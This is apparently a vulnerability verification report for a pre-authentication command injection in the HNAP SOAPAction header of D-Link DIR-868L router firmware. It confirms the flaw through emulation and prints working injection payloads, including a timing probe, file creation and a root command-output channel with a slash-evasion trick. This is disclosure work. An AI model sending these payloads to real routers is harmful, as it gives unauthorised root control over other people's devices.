# Verification — HNAP Pre-auth Command Injection

Four independent levels, all against the exact shipped binary
(MD5 `64a37f67c57dc25b3678dbcc8554c10e`).

## 1. Unicorn emulation of the real ARM code

Harness: `poc/verify_hnap_pigw.py` (emulates the firmware image directly,
PLT-imported libc re-implemented; `sub_1E570` phpcgi runner stubbed).

Environment: `REQUEST_METHOD=GET`,
`HTTP_SOAPACTION='"http://purenetworks.com/HNAP1/GetDeviceSettings/;usjsbCLImDiXsYwO;"'`
(no cookie, no `HNAP_AUTH` header).

Observed:

```
HMAC verify (sub_19BB8) called : False          <- authentication never invoked
system() calls                 : ['sh /var/run/;usjsbCLImDiXsYwO;.sh > /dev/console &']
```

The attacker-controlled marker reaches `system()` verbatim on the
pre-auth path.

## 2. qemu-arm user-mode execution (real uClibc loader, real fork/exec)

`poc/hnap_qemu_root.sh` — the firmware's `cgibin` copied as `./hnap`
(argv[0] basename selects the hnap dispatcher), run under
`qemu-arm-static -L <squashfs-root>` with the CGI environment.

| Test | Result |
|---|---|
| baseline `GetDeviceSettings` | reaches `system("sh /var/run/GetDeviceSettings.sh …")` — `sh: cannot open /var/run/GetDeviceSettings.sh` |
| `; touch HNAP_PWNED; id > ID_OUT;` | both files created; `ID_OUT` = `uid=0(root) gid=0(root) …` |
| `; sleep 10;` | wall time **10.018 s** (baseline is instant) |
| `strace -f -e execve` | `execve("/bin/sh", ["sh","-c","sh /var/run/; touch HNAP_PWNED;."...]) = 0` → `execve("/usr/bin/touch", ["touch","HNAP_PWNED"]) = 0` |

## 3. FirmAE full-system emulation over HTTP

Target `http://192.168.0.1/HNAP1/` (device booted from the same firmware):

| Request | Status | Time | Meaning |
|---|---|---|---|
| normal `GetDeviceSettings` | 200, 4179 B XML | 0.03 s | pre-auth feature works |
| `.../HNAP1/ZZZTestAction` | **401 Not Authorized** | 0.01 s | **control: gate enforced** |
| `.../GetDeviceSettings/; sleep 10;` | 500 | **10.02 s** | injection |
| `.../GetDeviceSettings/; sleep 5;` | 500 | **5.02 s** | dose-dependent |

Output channel (with CGI header prefix):

```
SOAPACTION: ".../GetDeviceSettings/; echo Content-Type: text/plain; echo; uname -a;"
-> 200 OK, body: "Linux dlinkrouter 4.1.17+ #18 ... armv7l GNU/Linux"

SOAPACTION: "...; s=`echo $PATH | busybox cut -c1`; echo Content-Type: text/plain; echo; cat ${s}proc${s}self${s}status;"
-> 200 OK, body contains: Uid:    0 0 0 0        (root)
```

## 4. Real-device reachability (authorized test unit)

On the reporter's authorized DIR-868L B1 the main httpd binds only the LAN
address (`192.168.0.1:80`), so with solely the SharePort WAN instance
(port 8181, no `/HNAP1` alias) exposed, the HNAP entry point was not
reachable from the WAN in that device's current configuration. Full-system
verification was therefore completed on FirmAE; the code path is identical
(analysis applies to the shipped binary by hash).

## Reproduction pointers

| Artifact | Purpose |
|---|---|
| `poc/poc_hnap_injection.py` | standalone PoC — timing oracle + output channel |
| `poc/hnap_http_poc.sh` | FirmAE test suite (baseline / 401 control / injections) |
| `poc/hnap_qemu_root.sh` | user-mode reproduction incl. strace capture |
| `poc/verify_hnap_pigw.py` | Unicorn harness (also covers the pigwidgeon overflow) |
